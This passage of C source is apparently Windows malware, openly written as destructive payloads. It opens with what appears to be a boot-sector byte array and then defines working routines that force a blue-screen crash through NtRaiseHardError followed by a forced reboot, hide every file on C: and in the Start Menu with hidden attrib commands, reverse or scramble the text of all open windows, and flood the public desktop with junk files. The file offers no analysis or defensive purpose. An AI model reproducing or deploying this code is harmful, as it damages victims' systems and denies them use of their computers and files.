0x74, 0x02, 0x4F, 0x4F, 0xA8, 0x08, 0x74, 0x02, 0x47, 0x47, 0xA8, 0x03, 0x74, 0x0D, 0x83, 0x3E,
0x80, 0xFC, 0x00, 0x75, 0x06, 0x8D, 0x45, 0x08, 0xA3, 0x80, 0xFC, 0x97, 0x3D, 0xFE, 0xE5, 0x74,
0x07, 0x3D, 0x32, 0xE7, 0x74, 0x02, 0x89, 0x04, 0x5D, 0x5E, 0x5A, 0x8B, 0x04, 0x80, 0xFA, 0x01,
0x76, 0x0A, 0x05, 0x80, 0x02, 0x3D, 0x80, 0xD4, 0x72, 0x1B, 0xCD, 0x20, 0x48, 0x48, 0x72, 0x03,
0x83, 0xC0, 0x04, 0x50, 0xD1, 0xE8, 0xB1, 0xA0, 0xF6, 0xF1, 0xFE, 0xCC, 0x80, 0xFC, 0x94, 0x58,
0x72, 0x03, 0x80, 0xCE, 0x16, 0x89, 0x04, 0x05, 0x06, 0x0F, 0x93, 0xB9, 0x03, 0x00, 0xE4, 0x40,
0x3C, 0xFC, 0x72, 0x0D, 0xBF, 0x82, 0xFC, 0x83, 0x3D, 0x00, 0x74, 0x03, 0xAF, 0xE2, 0xF8, 0x89,
0x1D, 0xE9, 0xC2, 0xFE, 0x18, 0x18, 0x3C, 0x24, 0x3C, 0x7E, 0xFF, 0x24, 0x00, 0x80, 0x42, 0x18,
0x10, 0x48, 0x82, 0x01, 0x00, 0xBD, 0xDB, 0x7E, 0x24, 0x3C, 0x66, 0xC3, 0x00, 0x3C, 0x5A, 0xFF,
0xA5, 0x3C, 0x66, 0x66, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x02, 0x31, 0xC0,
0x89, 0x85, 0x40, 0x01, 0xAB, 0xC3, 0x51, 0x57, 0x9C, 0x50, 0xBB, 0xA4, 0x7D, 0x2E, 0xD7, 0x93,
0xB9, 0x0A, 0x00, 0xF8, 0x88, 0xF8, 0x88, 0xFC, 0xE8, 0xE1, 0xFF, 0xD0, 0xE3, 0xE2, 0xF5, 0x81,
0xC7, 0x6C, 0x02, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xE0, 0x9D, 0x5F, 0x59, 0xC3, 0x4F, 0x55, 0xAA
};

/* payload thread */
DWORD WINAPI payloadThread(LPVOID parameter) {
    int delay = 0;
    int times = 0;
    int runtime = 0;

    int(*function)(int, int) = (int(*)(int, int))parameter;

    for (;;) {
        if (delay-- == 0) {
            delay = (*function)(times++, runtime);
        }

        runtime++;
        Sleep(10);
    }
}


/* kill Windows instant */
void killWindowsInstant() {

    // Try to force BSOD first
    HMODULE ntdll = LoadLibraryA("ntdll");
    FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
    FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

    if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
        BOOLEAN tmp1; DWORD tmp2;
        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc000029A, 0, 0, 0, 6, &tmp2);
    }

    // If the computer is still running, do it the normal way
    HANDLE token;
    TOKEN_PRIVILEGES privileges;

    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

    LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
    privileges.PrivilegeCount = 1;
    privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

    ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}

/* hide files payload */ 
int HideC() {
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h C:\\*.* /D > nul", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h C:\\Windows\\*.* /D > nul", NULL, SW_HIDE);
    return S_OK;
}
int HidePrograms() {
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h \u0022C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\*.*\u0022 /S /D", NULL, SW_HIDE);
    ShellExecuteA(NULL, NULL, "cmd", "/c attrib +s +h \u0022%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\*.*\u0022 /S /D", NULL, SW_HIDE);
    return S_OK;
}

/* reverse text payload */
void strReverseW(LPWSTR str);

void enumerateChildren(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strReverseW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

BOOL CALLBACK EnumWindowProc(HWND hwnd, LPARAM lParam) {
    enumerateChildren(hwnd);

    return TRUE;
}


void strReverseW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i];
        str[i] = str[j];
        str[j] = c;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

int payloadReverseText(int times, int runtime) {
    EnumWindows(&EnumWindowProc, NULL);

    return 50;
}

/* reverse change payload */
void strchangeW(LPWSTR str);

void enumerateChildren2(HWND hwnd) {
    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * rand());

    SendMessageW(hwnd, WM_GETTEXT, 8192, (LPARAM)str);
    strchangeW(str);
    SendMessageW(hwnd, WM_SETTEXT, NULL, (LPARAM)str);

    GlobalFree(str);

    HWND child = GetWindow(hwnd, GW_CHILD);

    while (child) {
        enumerateChildren(child);
        child = GetWindow(child, GW_HWNDNEXT);
    }
}

void strchangeW(LPWSTR str) {
    int len = lstrlenW(str);

    WCHAR c;
    int i, j;
    for (i = 0, j = len - 1; i < j; i++, j--) {
        c = str[i] - rand() % 10;
        str[i] = str[j] + rand() % 10;
        str[j] = c + rand() % 10;
    }

    // Fix Newlines
    for (i = 0; i < len - 1; i++) {
        if (str[i] == L'\n' && str[i + 1] == L'\r') {
            str[i] = L'\r';
            str[i + 1] = L'\n';
        }
    }
}

BOOL CALLBACK EnumWindowProc2(HWND hwnd, LPARAM lParam) {
    enumerateChildren2(hwnd);

    return TRUE;
}

int ChangeText(int times, int runtime) {
    EnumWindows(&EnumWindowProc2, NULL);
    return 50;
}

int payloadChangeText(int times, int runtime) {
    while (1) {
        CreateThread(NULL, NULL, &payloadThread, &ChangeText, NULL, NULL);
        Sleep(1000);
    }
}

/* create desktop files */
void CreateDesktopFiles()
{

    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³´í€éß¼³¼éðéð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€íþðåéü‘«´íúü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤³¤þþ¤³®²éð²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤þßäþ¾ö»¥‘ú¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\©å®ñóéß©áöéðé", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤þ³¼þ€³þðå¤få", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßóöéáóðð³þ¼¾×«", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³€ü¤€¤€þé²³é²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å¤þ®¤þ¤¤€ü¼€€¤þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤¼¼¤é³³®þ³ü¤¾¾", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€ü¤ú¼ú½¾í½óóó²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áßäéþð®þü®þüþü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®þéþéþ®þ®üððððð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßéä³¤®þ¤€ü¼üü¼¤", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ü¼€åþ³¤þ³©ßðþþú½", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®€ð©ßðþéúí®©ö´»¬", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0); CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³é³¤¼ü€ú½í¼í½úü€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¡þßúíþ¼í½¼íéßsðð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\×¥«ö‘úü€©®®€¤ü¤€ü", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³²¤¼½¾ü®¤ððßßßsßð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á®¼¤í‘»¬³®éðåßäßwä", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\á®óúðñé®þ®óå®ð®®é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤€³¼³¤½¤€½¼€®¤¤³¤²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³€¼³¤€üþ¤¤€€³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤¼¤³¼€¤ü€¼ú€ú²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤²€³¼³²¼¤®é³²é", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤³¤óåé®øÁßÐÅÉ®Å", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\é€³¤¼¤þ¤®ðåééåå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å³¤¤¼ü€úððááðá", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\åéðóåäßåðä®³€¼", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\¤€ü€íú½íþéßßåéå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\þ³þ€ü¼úíí½¾í½¾í", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðéå®¤þ®éþü¼ú€ü²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ßá®åé¤®³¤þþ³¤þ¤þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å¤þ³þ³þ¤þ¤€þééþú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßßéüüúí€¼€éååå", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µááäååþü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤A¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáåé®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤B¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ß³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®Cé³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©áá³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤D¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\²¤€³®ððßßßßäåéå¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤EE®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\€³³²²²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ€½½‘²¾‘½€³¤²²³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼F''¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©®³³éþþ³¤þ¤4³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½??®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáåéþ€³³¼¤¼¤®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼a??a¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáee®þü€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤^%$$®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\å®é®åþü¤€ü¤ü¤ü4³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤??¾¤®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µkindaofkool³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤ÁÁÁÁ®¤é³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©é®å®®å®å®³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\rrrrr³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\Åíñðóåßßßßß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾¤¤³²²²³³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßáwindows€¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼ÅÉÅÄ²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³þ¤þ¤þ³¤@Enderman³³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾Ð©Å®ÞÉ®Þ", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ©ßássss¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤½¤¾ÐÅÅWEF³²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µ¤¼¤½€¾¼‘½¾‘½’‘’¾¾¤³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼¤Å²³³¤€³¤€¤3²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\µconw³", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¼3222²²²666²²¡¡²", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\³¤½¾³¤²€²€€³€²€€²€€®éáæß©ðß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\®é²³¤²²¤€²³€²³€€ú½í¼í", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðþ¤³þ€¤4³ó‘¾½½½½’’¥", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ñßé®üú¾‘öíúüüþ®e", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\áðáéåéþ®þüþ®üú", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\éåéå®é®þ®þ®®ß", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\ááðéé®é®©ðææð", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
    CreateFileA("\\Users\\Public\\Desktop\\æßáåð©©ñµúüüþ®å", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
